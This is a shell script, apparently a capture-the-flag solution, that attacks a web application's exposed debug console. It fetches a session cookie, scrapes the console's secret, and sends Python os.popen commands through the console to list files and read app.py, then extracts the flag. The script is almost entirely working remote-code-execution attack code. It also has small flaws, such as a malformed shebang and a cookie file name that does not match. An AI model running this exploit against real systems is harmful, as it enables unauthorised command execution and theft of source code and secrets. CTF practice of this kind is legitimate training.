#/bin/sh

# Retrieve absolute path to this script
script=$(readlink -f $0)
scriptpath=`dirname $script`

# Define host IP ( the machine to attack ) and remote IP ( the machine which supports the attack )
target_ip="10.10.195.209"
attack_ip="10.10.113.137"

# Prepare environment
mkdir /work/ 2>/dev/null

# Initiate session
echo "1 - INITIATING SESSION"
curl -s -X GET "http://$target_ip:86" -c "/work/5-cookies.txt" -L > /dev/null
PHPSESSID=$(grep PHPSESSID "/work/cookies.txt" | awk '{print $7}')
echo "--> Session initiated : $PHPSESSID"

# Retrieving console secret
echo "2 - RETRIEVING CONSOLE SECRET"
curl -s -X GET "http://$target_ip:86/console" > /work/5-console.html
SECRET=$(awk -F'"' '/SECRET =/ {print $2}' /work/5-console.html)
echo "--> Console secret is : $SECRET"

# Listing files
echo "3 - LISTING FILES WITH PYTHON"
curl -s -X GET "http://$target_ip:86/console?cmd=import%20os%3B%20print(os.popen(%22ls%20-l%22).read())&__debugger__=yes&frm=0&s=$SECRET" > /work/5-ls.html
cat /work/5-ls.html

# Reading app.py
echo "4 - PARSING APP.PY"
curl -s -X GET "http://$target_ip:86/console?cmd=import%20os%3B%20print(os.popen(%22cat%20app.py%22).read())&__debugger__=yes&frm=0&s=$SECRET" > /work/5-app.html
echo "--> Flag is : $(sed -n 's/.*&quot;\(.*{.*}\)&quot;.*/\1/p' /work/5-app.html)"